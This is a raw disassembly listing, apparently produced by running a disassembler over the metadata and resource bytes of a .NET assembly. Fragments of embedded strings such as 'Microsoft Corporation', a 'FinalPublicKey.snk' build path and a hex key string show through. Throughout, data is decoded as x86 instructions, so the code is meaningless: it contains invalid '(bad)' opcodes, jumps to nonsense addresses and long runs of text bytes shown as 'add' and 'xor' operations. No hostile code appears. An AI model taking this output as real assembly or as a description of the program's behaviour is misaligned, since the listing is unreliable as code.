  406b4d:	adc    dl,BYTE PTR ds:0x21120603
  406b53:	add    al,0x6
  406b55:	pop    ds
  406b56:	and    eax,0x1c060202
  406b5b:	add    eax,DWORD PTR [esi]
  406b5d:	adc    cl,BYTE PTR [esi+ecx*1]
  406b60:	inc    edx
  406b61:	add    BYTE PTR [ecx+0x0],ch
  406b64:	je     0x406b66
  406b66:	push   edx
  406b67:	add    BYTE PTR [ecx+0x0],ah
  406b6a:	je     0x406b6c
  406b6c:	add    BYTE PTR gs:[edx],dl
  406b6f:	inc    esi
  406b70:	add    BYTE PTR [edx+0x0],dh
  406b73:	popa   
  406b74:	add    BYTE PTR [ebp+0x0],ch
  406b77:	add    BYTE PTR gs:[edx+0x0],dl
  406b7b:	popa   
  406b7c:	add    BYTE PTR [eax+eax*1+0x65],dh
  406b80:	add    BYTE PTR [eax],dl
  406b82:	inc    esp
  406b83:	add    BYTE PTR [ebp+0x0],dh
  406b86:	jb     0x406b88
  406b88:	popa   
  406b89:	add    BYTE PTR [eax+eax*1+0x69],dh
  406b8d:	add    BYTE PTR [edi+0x0],ch
  406b90:	outs   dx,BYTE PTR ds:[esi]
  406b91:	add    BYTE PTR [esi],dl
  406b93:	push   edx
  406b94:	add    BYTE PTR [ebp+0x0],ah
  406b97:	arpl   WORD PTR [eax],ax
  406b99:	outs   dx,DWORD PTR ds:[esi]
  406b9a:	add    BYTE PTR [edx+0x0],dh
  406b9d:	add    BYTE PTR fs:[ecx+0x0],al
  406ba1:	jne    0x406ba3
  406ba3:	add    BYTE PTR fs:[ecx+0x0],ch
  406ba7:	outs   dx,DWORD PTR ds:[esi]
  406ba8:	add    BYTE PTR [ebx],al
  406baa:	and    BYTE PTR [eax],al
  406bac:	add    al,BYTE PTR [eax+eiz*1]
  406baf:	add    DWORD PTR [ecx],eax
  406bb1:	add    al,BYTE PTR [eax+eiz*1]
  406bb4:	add    BYTE PTR [edx],dl
  406bb6:	sub    DWORD PTR ds:0x12010120,eax
  406bbc:	sub    DWORD PTR [ebx],eax
  406bbe:	and    BYTE PTR [eax],al
  406bc0:	push   cs
  406bc1:	add    al,0x20
  406bc3:	add    DWORD PTR [ecx],eax
  406bc5:	push   cs
  406bc6:	add    esp,DWORD PTR [eax]
  406bc8:	add    BYTE PTR [ecx],cl
  406bca:	add    al,0x20
  406bcc:	add    DWORD PTR [ecx],eax
  406bce:	or     DWORD PTR [esi],eax
  406bd0:	add    BYTE PTR [edx],al
  406bd2:	push   cs
  406bd3:	push   cs
  406bd4:	sbb    eax,0x3200a1c
  406bd9:	add    cl,BYTE PTR [esi]
  406bdb:	push   cs
  406bdc:	adc    eax,0xe012d12
  406be1:	add    eax,0xe010220
  406be6:	or     DWORD PTR [eax],ecx
  406be8:	and    BYTE PTR [ecx],al
  406bea:	add    DWORD PTR ds:0xe012d12,edx
  406bf0:	add    al,BYTE PTR [esi]
  406bf2:	add    al,BYTE PTR [ebx]
  406bf4:	push   es
  406bf5:	adc    ch,BYTE PTR [ecx]
  406bf7:	add    al,BYTE PTR [esi]
  406bf9:	or     DWORD PTR [ebx],eax
  406bfb:	sub    BYTE PTR [eax],al
  406bfd:	add    al,BYTE PTR [eax+ebp*1]
  406c00:	add    BYTE PTR [edx],dl
  406c02:	sub    DWORD PTR [ebx],eax
  406c04:	sub    BYTE PTR [eax],al
  406c06:	push   cs
  406c07:	add    ebp,DWORD PTR [eax]
  406c09:	add    BYTE PTR [ecx],cl
  406c0b:	or     eax,0x9010600
  406c10:	or     DWORD PTR [edx],eax
  406c12:	add    cl,BYTE PTR [esi]
  406c14:	adc    eax,0x8013112
  406c19:	add    eax,DWORD PTR [eax]
  406c1b:	add    BYTE PTR [ecx],al
  406c1d:	add    eax,0x10010100
  406c22:	push   cs
  406c23:	add    al,0x0
  406c25:	add    DWORD PTR [ecx],eax
  406c27:	sbb    al,0x5
  406c29:	add    BYTE PTR [edx],al
  406c2b:	add    DWORD PTR [eax],ecx
  406c2d:	push   cs
  406c2e:	add    eax,DWORD PTR [esi]
  406c30:	adc    dh,BYTE PTR ds:0x69004d76
  406c36:	add    BYTE PTR [ebx+0x0],ah
  406c39:	jb     0x406c3b
  406c3b:	outs   dx,DWORD PTR ds:[esi]
  406c3c:	add    BYTE PTR [ebx+0x0],dh
  406c3f:	outs   dx,DWORD PTR ds:[esi]
  406c40:	add    BYTE PTR [esi+0x0],ah
  406c43:	je     0x406c45
  406c45:	add    BYTE PTR cs:[esi+0x0],dl
  406c49:	imul   eax,DWORD PTR [eax],0x750073
  406c4f:	popa   
  406c50:	add    BYTE PTR [eax+eax*1+0x53],ch
  406c54:	add    BYTE PTR [eax+eax*1+0x75],dh
  406c58:	add    BYTE PTR [eax+eax*1+0x69],ah
  406c5c:	add    BYTE PTR [edi+0x0],ch
  406c5f:	add    BYTE PTR cs:[ecx+0x0],dl
  406c63:	jne    0x406c65
  406c65:	popa   
  406c66:	add    BYTE PTR [eax+eax*1+0x69],ch
  406c6a:	add    BYTE PTR [eax+eax*1+0x79],dh
  406c6e:	add    BYTE PTR [eax+eax*1+0x6f],dl
  406c72:	add    BYTE PTR [edi+0x0],ch
  406c75:	ins    BYTE PTR es:[edi],dx
  406c76:	add    BYTE PTR [ebx+0x0],dh
  406c79:	add    BYTE PTR cs:[esi+0x0],dl
  406c7d:	imul   eax,DWORD PTR [eax],0x650064
  406c83:	outs   dx,DWORD PTR ds:[esi]
  406c84:	add    BYTE PTR [edx+0x0],dl
  406c87:	add    BYTE PTR gs:[ebx+0x0],ah
  406c8b:	outs   dx,DWORD PTR ds:[esi]
  406c8c:	add    BYTE PTR [edx+0x0],dh
  406c8f:	add    BYTE PTR fs:[ebp+0x0],ah
  406c93:	jb     0x406c95
  406c95:	inc    ebp
  406c96:	add    BYTE PTR [esi+0x0],ch
  406c99:	add    BYTE PTR [bx+di+0x0],ch
  406c9d:	outs   dx,BYTE PTR ds:[esi]
  406c9e:	add    BYTE PTR [ebp+0x0],ah
  406ca1:	add    BYTE PTR cs:[eax+eax*1+0x6c],ah
  406ca6:	add    BYTE PTR [eax+eax*1+0x8],ch
  406caa:	add    BYTE PTR ds:0x2090908,al
  406cb0:	add    cl,BYTE PTR [esi]
  406cb2:	add    eax,DWORD PTR [eax]
  406cb4:	add    BYTE PTR [eax],cl
  406cb6:	add    eax,0x10080100
  406cbb:	push   cs
  406cbc:	add    eax,DWORD PTR [esi]
  406cbe:	adc    bh,BYTE PTR [ecx]
  406cc0:	add    eax,DWORD PTR [esi]
  406cc2:	adc    bh,BYTE PTR ds:0x12000004
  406cc8:	cmp    DWORD PTR [eax+eax*1],eax
  406ccb:	add    BYTE PTR [edx],dl
  406ccd:	cmp    eax,0x1010005
  406cd2:	adc    bh,BYTE PTR ds:0xe000003
  406cd8:	add    al,0x8
  406cda:	add    BYTE PTR [edx],dl
  406cdc:	cmp    DWORD PTR [eax+ecx*1],eax
  406cdf:	add    BYTE PTR [edx],dl
  406ce1:	cmp    eax,0xe000803
  406ce6:	add    al,0x1
  406ce8:	add    BYTE PTR [eax],al
  406cea:	add    BYTE PTR ds:0x11010120,al
  406cf0:	dec    ebp
  406cf1:	add    DWORD PTR ds:0x20061301,edx
  406cf7:	add    DWORD PTR [ecx],eax
  406cf9:	adc    DWORD PTR [eax+0xa080a1],eax
  406cff:	and    al,0x0
  406d01:	add    BYTE PTR [eax+eax*4],al
  406d04:	add    BYTE PTR [eax],al
  406d06:	xchg   esp,eax
  406d07:	add    BYTE PTR [eax],al
  406d09:	add    BYTE PTR [esi],al
  406d0b:	add    al,BYTE PTR [eax]
  406d0d:	add    BYTE PTR [eax],al
  406d0f:	and    al,0x0
  406d11:	add    BYTE PTR [edx+0x53],dl
  406d14:	inc    ecx
  406d15:	xor    DWORD PTR [eax],eax
  406d17:	add    al,0x0
  406d19:	add    BYTE PTR [ecx],al
  406d1b:	add    BYTE PTR [ecx],al
  406d1d:	add    BYTE PTR [edi],al
  406d1f:	sar    edx,1
  406d21:	push   edi
  406d22:	les    ebp,FWORD PTR [esi+0x2ea3f0d9]
  406d28:	test   BYTE PTR [edx+0xdfdae0f],ch
  406d2e:	jmp    0xecab6b1b
  406d33:	pop    DWORD PTR [edi+0x6c7603fb]
  406d39:	or     DWORD PTR [ecx+ebx*4-0x6e],0x1e
  406d3e:	mov    dl,0x3b
  406d40:	out    0x9a,eax
  406d42:	(bad)  
  406d44:	fadd   st(1),st
  406d46:	fstp   QWORD PTR [edx+0x211336d2]
  406d4c:	add    dl,BYTE PTR [eax-0x6c38df5]
  406d52:	adc    BYTE PTR [ebp+0x77e1c47f],0x10
  406d59:	pop    esi
  406d5b:	pop    es
  406d5c:	ja     0x406dad
  406d5e:	sub    eax,ebp
  406d60:	xor    cl,BYTE PTR [esi]
  406d62:	xchg   edx,eax
  406d63:	jmp    0xc021:0xe8e4ec05
  406d6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d6b:	out    dx,eax
  406d6c:	call   0x4c9cd262
  406d71:	or     al,0x93
  406d73:	shr    DWORD PTR [ebx+0x625d2899],0x2c
  406d7a:	stos   BYTE PTR es:[edi],al
  406d7b:	gs sub al,0x1d
  406d7e:	cli    
  406d7f:	(bad)  
  406d80:	cmp    eax,0x2d6f5d74
  406d85:	in     eax,0xf1
  406d87:	jle    0x406de7
  406d89:	scas   eax,DWORD PTR es:[edi]
  406d8a:	pinsrw mm2,WORD PTR [esi-0x75e3d9c3],0x12
  406d92:	inc    ebx
  406d93:	sbb    BYTE PTR gs:[eax],ah
  406d96:	ins    DWORD PTR es:[edi],dx
  406d97:	rcl    BYTE PTR [ebx-0x2da5b2cc],0x93
  406d9e:	add    al,0x0
  406da0:	add    DWORD PTR [ecx],eax
  406da2:	push   cs
  406da3:	add    eax,0x80110000
  406da8:	lods   eax,DWORD PTR ds:[esi]
  406da9:	or     DWORD PTR [eax],eax
  406dab:	add    ecx,DWORD PTR [esi]
  406dad:	adc    al,BYTE PTR [eax+0x1c1d0eb5]
  406db3:	add    eax,0x80120000
  406db8:	mov    ecx,0x1022005
  406dbd:	sbb    al,0x18
  406dbf:	push   es
  406dc0:	and    BYTE PTR [ecx],al
  406dc2:	add    DWORD PTR [edx],edx
  406dc4:	cmp    BYTE PTR [ebp+0x11030709],0x80
  406dcb:	lods   eax,DWORD PTR ds:[esi]
  406dcc:	adc    dl,BYTE PTR [ebx*1+0x107041c]
  406dd3:	sbb    eax,0x200061c
  406dd8:	add    DWORD PTR [esi],ecx
  406dda:	sbb    eax,0x100041c
  406ddf:	add    cl,BYTE PTR [esi]
  406de1:	add    eax,0x1311215
  406de6:	or     BYTE PTR [ebx],cl
  406de8:	pop    es
  406de9:	add    eax,0x80120e02
  406dee:	leave  
  406def:	sbb    eax,0x61c1d1c
  406df4:	add    BYTE PTR [edx],al
  406df6:	add    DWORD PTR [eax+edx*1],ebx
  406df9:	add    al,BYTE PTR [edi+eax*1]
  406dfc:	add    al,BYTE PTR [edx]
  406dfe:	sbb    al,0x7
  406e00:	add    BYTE PTR [ecx],al
  406e02:	or     BYTE PTR ds:0x7d58012,bl
  406e08:	pop    es
  406e09:	add    cl,BYTE PTR [eax]
  406e0b:	sbb    eax,0x7d58012
  406e10:	add    BYTE PTR [ecx],al
  406e12:	adc    al,BYTE PTR [eax+0x80912dd]
  406e18:	add    BYTE PTR [ecx],al
  406e1a:	adc    al,BYTE PTR [eax-0x1a7fee1f]
  406e20:	pop    es
  406e21:	add    BYTE PTR [edx],al
  406e23:	sbb    al,0x12
  406e25:	and    cl,0xe
  406e28:	add    al,0x0
  406e2a:	add    DWORD PTR [ecx],eax
  406e2c:	or     BYTE PTR [edx],cl
  406e2e:	pop    es
  406e2f:	add    al,0xe
  406e31:	adc    al,BYTE PTR [eax+0x1d1c1dc9]
  406e37:	sbb    al,0x4
  406e39:	add    BYTE PTR [eax],al
  406e3b:	adc    ch,BYTE PTR [ecx]
  406e3d:	add    esp,DWORD PTR [eax]
  406e3f:	add    BYTE PTR [edx],cl
  406e41:	add    eax,0x1c010220
  406e46:	sbb    al,0x5
  406e48:	add    BYTE PTR [eax],al
  406e4a:	adc    al,BYTE PTR [eax+0x12006f9]
  406e50:	add    DWORD PTR [ecx],edx
  406e52:	add    DWORD PTR [ecx],0x103200c
  406e58:	adc    al,BYTE PTR [ecx+0xd811209]
  406e5e:	adc    al,BYTE PTR [ecx+0x2000711]
  406e64:	add    DWORD PTR [edx],edx
  406e66:	sbb    DWORD PTR [ecx],0x9071502
  406e6c:	push   cs
  406e6d:	adc    al,BYTE PTR [eax-0x27fed0b]
  406e73:	adc    dl,BYTE PTR ds:0x80111c1d
  406e79:	lods   eax,DWORD PTR ds:[esi]
  406e7a:	sbb    eax,0x1c1d1c1c
  406e7f:	add    eax,0x12020100
  406e84:	or     DWORD PTR [esi],eax
  406e86:	add    BYTE PTR [ecx],al
  406e88:	add    DWORD PTR [edx],edx
  406e8a:	sbb    DWORD PTR [ecx],0x12020707
  406e90:	or     cl,0x1d
  406e93:	sbb    al,0x6
  406e95:	and    BYTE PTR [ecx],al
  406e97:	add    DWORD PTR [edx],edx
  406e99:	sbb    DWORD PTR ds:0x1012004,0x100061c
  406ea3:	add    DWORD PTR [edx],edx
  406ea5:	sub    DWORD PTR [ecx],0x2010006
  406eab:	adc    al,BYTE PTR [ecx+0x1070531]
  406eb1:	adc    al,BYTE PTR [ecx+0x2000531]
  406eb7:	add    DWORD PTR [esi],ecx
  406eb9:	sbb    al,0x9
  406ebb:	pop    es
  406ebc:	add    edx,DWORD PTR [edx]
  406ebe:	or     cl,0x1d
  406ec1:	sbb    al,0x1d
  406ec3:	sbb    al,0x5
  406ec5:	adc    eax,0xe012d12
  406eca:	or     BYTE PTR [eax],al
  406ecc:	add    eax,DWORD PTR [edx]
  406ece:	push   cs
  406ecf:	push   cs
  406ed0:	adc    DWORD PTR [ecx+0x2000639],eax
  406ed6:	add    cl,BYTE PTR [esi]
  406ed8:	adc    BYTE PTR [eax],cl
  406eda:	add    eax,0x29120100
  406edf:	or     BYTE PTR ds:0x13010120,al
  406ee5:	add    BYTE PTR ds:0x81120000,al
  406eeb:	cmp    eax,0x12010006
  406ef0:	add    DWORD PTR [ecx+0xe],0x20d0719
  406ef7:	adc    eax,0xe012d12
  406efc:	or     BYTE PTR [eax],cl
  406efe:	push   cs
  406eff:	adc    al,BYTE PTR [ecx+0xe0e0e41]
  406f05:	sbb    eax,0x1d1c1d1c
  406f0a:	sbb    al,0x1d
  406f0c:	sbb    al,0x8
  406f0e:	mov    al,0x3f
  406f10:	pop    edi
  406f11:	jg     0x406f24
  406f13:	aad    0xa
  406f15:	cmp    al,BYTE PTR ds:0x81120000
  406f1b:	dec    ecx
  406f1c:	add    al,0x20
  406f1e:	add    DWORD PTR [esi],ecx
  406f20:	push   cs
  406f21:	push   es
  406f22:	add    BYTE PTR [edx],al
  406f24:	add    cl,BYTE PTR [esi]
  406f26:	adc    BYTE PTR [edx],al
  406f28:	or     eax,0xe0e0707
  406f2d:	push   cs
  406f2e:	push   cs
  406f2f:	add    dl,BYTE PTR ds:0xe012d12
  406f35:	add    al,BYTE PTR [esi]
  406f37:	add    BYTE PTR [edx],al
  406f39:	add    cl,BYTE PTR [esi]
  406f3b:	adc    BYTE PTR [ecx],cl
  406f3d:	or     BYTE PTR [edi],al
  406f3f:	add    al,0x9
  406f41:	add    bl,BYTE PTR ds:0x51c1d1c
  406f47:	add    BYTE PTR [edx],al
  406f49:	add    cl,BYTE PTR [esi]
  406f4b:	push   cs
  406f4c:	add    eax,DWORD PTR [edi]
  406f4e:	add    DWORD PTR [esi],ecx
  406f50:	or     DWORD PTR [eax],esp
  406f52:	add    BYTE PTR ds:0x1518111,dl
  406f58:	adc    eax,DWORD PTR [eax]
  406f5a:	push   es
  406f5b:	adc    eax,0x1518111
  406f60:	push   cs
  406f61:	add    al,0x20
  406f63:	add    BYTE PTR [ebx],dl
  406f65:	add    BYTE PTR [ecx],cl
  406f67:	pop    es
  406f68:	add    cl,BYTE PTR [esi]
  406f6a:	adc    eax,0x1518111
  406f6f:	push   cs
  406f70:	or     DWORD PTR [eax],esp
  406f72:	add    al,0x1
  406f74:	adc    al,BYTE PTR [ecx+0x8081c55]
  406f7a:	add    eax,DWORD PTR [edi]
  406f7c:	add    DWORD PTR [eax],ecx
  406f7e:	or     BYTE PTR [edi],al
  406f80:	add    cl,BYTE PTR [eax]
  406f82:	adc    eax,0x8013112
  406f87:	add    eax,0x8020220
  406f8c:	or     BYTE PTR ds:0x8010220,al
  406f92:	push   cs
  406f93:	add    eax,0x1d0e0207
  406f98:	sbb    al,0x5
  406f9a:	and    BYTE PTR [edx],al
  406f9c:	add    DWORD PTR [esi],ecx
  406f9e:	push   cs
  406f9f:	inc    eax
  406fa0:	add    DWORD PTR [eax],eax
  406fa2:	xor    edx,DWORD PTR [ebx+0x79]
  406fa5:	jae    0x40701b
  406fa7:	gs ins DWORD PTR es:[edi],dx
  406fa9:	cs push edx
  406fab:	gs jae 0x40701d
  406fae:	jne    0x407022
  406fb0:	arpl   WORD PTR [ebp+0x73],sp
  406fb3:	cs push esp
  406fb5:	outs   dx,DWORD PTR ds:[esi]
  406fb6:	outs   dx,DWORD PTR ds:[esi]
  406fb7:	ins    BYTE PTR es:[edi],dx
  406fb8:	jae    0x406fe8
  406fba:	push   ebx
  406fbb:	je     0x40702f
  406fbd:	outs   dx,DWORD PTR ds:[esi]
  406fbe:	outs   dx,BYTE PTR ds:[esi]
  406fbf:	ins    BYTE PTR es:[di],dx
  406fc1:	jns    0x407017
  406fc3:	jns    0x407035
  406fc5:	gs fs push edx
  406fc8:	gs jae 0x40703a
  406fcb:	jne    0x40703f
  406fcd:	arpl   WORD PTR [ebp+0x42],sp
  406fd0:	jne    0x40703b
  406fd2:	ins    BYTE PTR es:[edi],dx
  406fd3:	fs gs jb 0x406fde
  406fd7:	xor    al,0x2e
  406fd9:	xor    BYTE PTR [esi],ch
  406fdb:	xor    BYTE PTR [esi],ch
  406fdd:	xor    BYTE PTR [eax],al
  406fdf:	add    BYTE PTR ds:0x1c020200,al
  406fe5:	sbb    al,0x5
  406fe7:	and    BYTE PTR [eax],al
  406fe9:	adc    al,BYTE PTR [ecx+0x220073d]
  406fef:	add    DWORD PTR [esi],ecx
  406ff1:	adc    al,BYTE PTR [ecx+0x107043d]
  406ff7:	adc    bh,BYTE PTR [ecx]
  406ff9:	push   es
  406ffa:	and    BYTE PTR [edx],al
  406ffc:	push   cs
  406ffd:	push   cs
  406ffe:	adc    bh,BYTE PTR ds:0x1012006
  407004:	adc    DWORD PTR [ecx+0x10871],eax
  40700a:	add    al,BYTE PTR [eax]
  40700c:	add    BYTE PTR [eax],al
  40700e:	add    BYTE PTR [eax],al
  407010:	inc    esi
  407011:	add    DWORD PTR [eax],eax
  407013:	sub    DWORD PTR [esi],ebp
  407015:	dec    esi
  407016:	inc    ebp
  407017:	push   esp
  407018:	inc    esi
  407019:	jb     0x40707c
  40701b:	ins    DWORD PTR es:[edi],dx
  40701c:	gs ja  0x40708e
  40701f:	jb     0x40708c
  407021:	sub    al,0x56
  407023:	gs jb  0x407099
  407026:	imul   ebp,DWORD PTR [edi+0x6e],0x2e34763d
  40702d:	xor    BYTE PTR [eax+edx*2],ch
  407030:	jb     0x4070a1
  407032:	imul   bp,WORD PTR [ebp+eiz*2+0x3d],0x6c43
  407039:	imul   esp,DWORD PTR [ebp+0x6e],0x54000174
  407040:	push   cs
  407041:	adc    al,0x46
  407043:	jb     0x4070a6
  407045:	ins    DWORD PTR es:[edi],dx
  407046:	gs ja  0x4070b8
  407049:	jb     0x4070b6
  40704b:	inc    esp
  40704c:	imul   esi,DWORD PTR [ebx+0x70],0x4e79616c
  407053:	popa   
  407054:	ins    DWORD PTR es:[edi],dx
  407055:	add    BYTE PTR gs:0x1,al
  40705c:	add    BYTE PTR ds:0x10001,al
  407062:	add    BYTE PTR [eax],dh
  407064:	add    DWORD PTR [eax],eax
  407066:	sub    ecx,DWORD PTR [ebp+0x69]
  407069:	arpl   WORD PTR [edx+0x6f],si
  40706c:	jae    0x4070dd
  40706e:	data16 je 0x407091
  407071:	push   esi
  407072:	imul   esp,DWORD PTR [ebp+eiz*2+0x6f],0x646e6120
  40707a:	and    BYTE PTR [ecx+0x75],al
  40707d:	imul   ebp,DWORD PTR fs:[edi+0x20],0x6f636572
  407085:	jb     0x4070eb
  407087:	imul   ebp,DWORD PTR [esi+0x67],0x69747520
  40708e:	ins    BYTE PTR es:[edi],dx
  40708f:	imul   esi,DWORD PTR [ecx+edi*2+0x0],0x11a00
  407097:	adc    eax,0x7263694d
  40709c:	outs   dx,DWORD PTR ds:[esi]
  40709d:	jae    0x40710e
  40709f:	data16 je 0x4070c2
  4070a2:	inc    ebx
  4070a3:	outs   dx,DWORD PTR ds:[esi]
  4070a4:	jb     0x407116
  4070a6:	outs   dx,DWORD PTR ds:[esi]
  4070a7:	jb     0x40710a
  4070a9:	je     0x407114
  4070ab:	outs   dx,DWORD PTR ds:[esi]
  4070ac:	outs   dx,BYTE PTR ds:[esi]
  4070ad:	add    BYTE PTR [eax],al
  4070af:	and    eax,0x4d200001
  4070b4:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  4070bb:	je     0x40707f
  4070bd:	scas   al,BYTE PTR es:[edi]
  4070be:	and    BYTE PTR [esi+0x69],dl
  4070c1:	jae    0x407138
  4070c3:	popa   
  4070c4:	ins    BYTE PTR es:[edi],dx
  4070c5:	and    BYTE PTR [ebx+0x74],dl
  4070c8:	jne    0x40712e
  4070ca:	imul   ebp,DWORD PTR [edi-0x3e],0x303220ae
  4070d1:	xor    DWORD PTR [edx],esi
  4070d3:	add    BYTE PTR [eax],al
  4070d5:	xor    eax,DWORD PTR [ecx]
  4070d7:	add    BYTE PTR [esi],ch
  4070d9:	ret    0x20a9
  4070dc:	dec    ebp
  4070dd:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  4070e4:	je     0x407106
  4070e6:	inc    ebx
  4070e7:	outs   dx,DWORD PTR ds:[esi]
  4070e8:	jb     0x40715a
  4070ea:	outs   dx,DWORD PTR ds:[esi]
  4070eb:	jb     0x40714e
  4070ed:	je     0x407158
  4070ef:	outs   dx,DWORD PTR ds:[esi]
  4070f0:	outs   dx,BYTE PTR ds:[esi]
  4070f1:	and    BYTE PTR cs:[ecx+0x6c],al
  4070f5:	ins    BYTE PTR es:[edi],dx
  4070f6:	and    BYTE PTR [edx+0x69],dh
  4070f9:	addr16 push 0x72207374
  4070ff:	gs jae 0x407167
  407102:	jb     0x40717a
  407104:	gs fs add BYTE PTR cs:[eax],al
  407109:	adc    DWORD PTR [ecx],eax
  40710b:	add    BYTE PTR [ecx+esi*1],cl
  40710e:	xor    DWORD PTR [esi],ebp
  407110:	xor    BYTE PTR [esi],ch
  407112:	xor    eax,0x37323730
  407117:	xor    DWORD PTR cs:[eax],eax
  40711a:	add    BYTE PTR ds:0x31080001,cl
  407120:	xor    DWORD PTR [esi],ebp
  407122:	xor    BYTE PTR [esi],ch
  407124:	xor    BYTE PTR [esi],ch
  407126:	xor    BYTE PTR [eax],al
  407128:	add    BYTE PTR [edx],cl
  40712a:	add    DWORD PTR [eax],eax
  40712c:	add    eax,0x552d6e65
  407131:	push   ebx
  407132:	add    BYTE PTR [eax],al
  407134:	sub    al,BYTE PTR [ecx]
  407136:	add    BYTE PTR ds:0x645c3a46,ah
  40713c:	fs pop esp
  40713e:	je     0x4071af
  407140:	outs   dx,DWORD PTR ds:[esi]
  407141:	ins    BYTE PTR es:[edi],dx
  407142:	jae    0x4071a0
  407144:	fs gs jbe 0x4071ac
  407148:	imul   esi,DWORD PTR [esi+0x5c],0x616e6946
  40714f:	ins    BYTE PTR es:[edi],dx
  407150:	push   eax
  407151:	jne    0x4071b5
  407153:	ins    BYTE PTR es:[edi],dx
  407154:	imul   esp,DWORD PTR [ebx+0x4b],0x732e7965
  40715b:	outs   dx,BYTE PTR ds:[esi]
  40715c:	imul   eax,DWORD PTR [eax],0x0
  40715f:	push   ds
  407160:	add    DWORD PTR [eax],eax
  407162:	add    DWORD PTR [eax],eax
  407164:	push   esp
  407165:	add    dl,BYTE PTR [esi]
  407167:	push   edi
  407168:	jb     0x4071cb
  40716a:	jo     0x4071ba
  40716c:	outs   dx,DWORD PTR ds:[esi]
  40716d:	outs   dx,BYTE PTR ds:[esi]
  40716e:	inc    ebp
  40716f:	js     0x4071d4
  407171:	gs jo  0x4071e8
  407174:	imul   ebp,DWORD PTR [edi+0x6e],0x6f726854
  40717b:	ja     0x4071f0
  40717d:	add    DWORD PTR [ecx-0x7efffe92],eax
  407183:	push   0x6964654d
  407188:	popa   
  407189:	inc    esi
  40718a:	outs   dx,DWORD PTR ds:[esi]
  40718b:	jne    0x4071fb
  40718d:	fs popa 
  40718f:	je     0x4071fa
  407191:	outs   dx,DWORD PTR ds:[esi]
  407192:	outs   dx,BYTE PTR ds:[esi]
  407193:	push   edx
  407194:	arpl   WORD PTR gs:[edi+0x72],bp
  407198:	fs gs jb 0x4071f0
  40719c:	gs jae 0x407213
  40719f:	jae    0x4071cd
  4071a1:	and    BYTE PTR [eax+0x75],dl
  4071a4:	bound  ebp,QWORD PTR [ecx+ebp*2+0x63]
  4071a8:	dec    ebx
  4071a9:	gs jns 0x4071e9
  4071ac:	xor    BYTE PTR [eax],dh
  4071ae:	xor    dh,BYTE PTR [eax+esi*1]
  4071b1:	xor    BYTE PTR [eax],dh
  4071b3:	xor    BYTE PTR [eax],dh
  4071b5:	xor    al,0x38
  4071b7:	xor    BYTE PTR [eax],dh
  4071b9:	xor    BYTE PTR [eax],dh
  4071bb:	xor    BYTE PTR [ecx],bh
  4071bd:	xor    al,0x30
  4071bf:	xor    BYTE PTR [eax],dh
  4071c1:	xor    BYTE PTR [eax],dh
  4071c3:	xor    BYTE PTR [eax],dh
  4071c5:	xor    BYTE PTR ss:[edx],dh
  4071c8:	xor    BYTE PTR [eax],dh
  4071ca:	xor    BYTE PTR [eax],dh
  4071cc:	xor    BYTE PTR [eax],dh
  4071ce:	xor    dh,BYTE PTR [eax+esi*1]
  4071d1:	xor    BYTE PTR [eax],dh
  4071d3:	xor    BYTE PTR ds:0x34333532,dh
  4071d9:	xor    DWORD PTR [ebx],esi
  4071db:	xor    DWORD PTR [eax],esi
  4071dd:	xor    BYTE PTR [eax],dh
  4071df:	xor    al,0x30
  4071e1:	xor    BYTE PTR [eax],dh
  4071e3:	xor    BYTE PTR [eax],dh
  4071e5:	xor    DWORD PTR [eax],esi
  4071e7:	xor    BYTE PTR [eax],dh
  4071e9:	xor    DWORD PTR [eax],esi
  4071eb:	xor    BYTE PTR [eax],dh
  4071ed:	aaa    
  4071ee:	xor    DWORD PTR fs:[esi+0x61],esp
  4071f2:	xor    eax,0x61346337
  4071f7:	gs cmp DWORD PTR fs:[esi+0x30],esp
  4071fc:	popa   
  4071fd:	xor    esi,DWORD PTR [edx]
  4071ff:	cmp    BYTE PTR gs:[ecx+eiz*2],dh
  407203:	popa   
  407204:	xor    BYTE PTR [esi+0x61],ah
  407207:	gs data16 xor BYTE PTR fs:[ebp+eiz*2+0x39],ah
  40720e:	cmp    BYTE PTR gs:[esi+0x64],ah
  407212:	ss popa 
  407214:	arpl   WORD PTR gs:[eax],di
  407217:	data16 cmp BYTE PTR [edi],dh
  40721a:	bound  si,DWORD PTR [eax]
  40721d:	xor    esi,DWORD PTR [edi]
  40721f:	ss arpl WORD PTR ss:[eax],di
  407223:	xor    esi,DWORD PTR [ebx+eiz*2]
  407226:	cmp    DWORD PTR [ecx],edi
  407228:	cmp    DWORD PTR [edx],esi
  40722a:	xor    DWORD PTR [ebp+0x62],esp
  40722d:	xor    dh,BYTE PTR [ebx]
  40722f:	bound  esp,QWORD PTR [ebp+0x37]
  407232:	cmp    DWORD PTR [ecx+0x64],esp
  407235:	cmp    DWORD PTR [ebp+esi*1+0x64],esp
  407239:	arpl   WORD PTR [ebx+0x31],sp
  40723c:	fs cmp DWORD PTR fs:[ecx+0x64],esp
  407241:	xor    dh,BYTE PTR [ebx]
  407243:	xor    DWORD PTR ss:[ebx],esi
  407246:	xor    dh,BYTE PTR [ecx]
  407248:	xor    BYTE PTR [edx],dh
  40724a:	cmp    DWORD PTR [eax],esi
  40724c:	xor    BYTE PTR [edx+0x37],ah
  40724f:	xor    dh,BYTE PTR [ebx]
  407251:	arpl   WORD PTR [esi+0x39],sp
  407254:	cmp    BYTE PTR [eax],dh
  407256:	cmp    DWORD PTR ds:0x34636637,esi
  40725c:	xor    DWORD PTR gs:[edi],esi
  40725f:	aaa    
  407260:	xor    DWORD PTR [eax],esi
  407262:	cmp    BYTE PTR [esi+0x63],ah
  407265:	xor    BYTE PTR ss:[edi],dh
  407268:	aaa    
  407269:	aaa    
  40726a:	xor    al,0x66
  40726c:	xor    bh,BYTE PTR [ecx]
  40726e:	cmp    BYTE PTR gs:[ebx],dh
  407271:	xor    dh,BYTE PTR [eax]
  407273:	cmp    DWORD PTR gs:[edx],esi
  407276:	gs popa 
  407278:	xor    BYTE PTR ds:0x34656365,dh
  40727e:	cmp    BYTE PTR gs:[edx],dh
  407281:	xor    DWORD PTR [ebx+0x30],esp
  407284:	popa   
  407285:	xor    eax,0x38656665
  40728a:	xor    WORD PTR [esi],si
  40728d:	xor    al,0x35
  40728f:	arpl   WORD PTR [ebx+eiz*2],si
  407292:	xor    BYTE PTR [ebx+0x39],ah
  407295:	xor    esp,DWORD PTR [ebx+0x31]
  407298:	popa   
  407299:	bound  edi,QWORD PTR [ecx]
  40729b:	cmp    DWORD PTR [edx],esi
  40729d:	cmp    BYTE PTR ds:0x32323664,dh
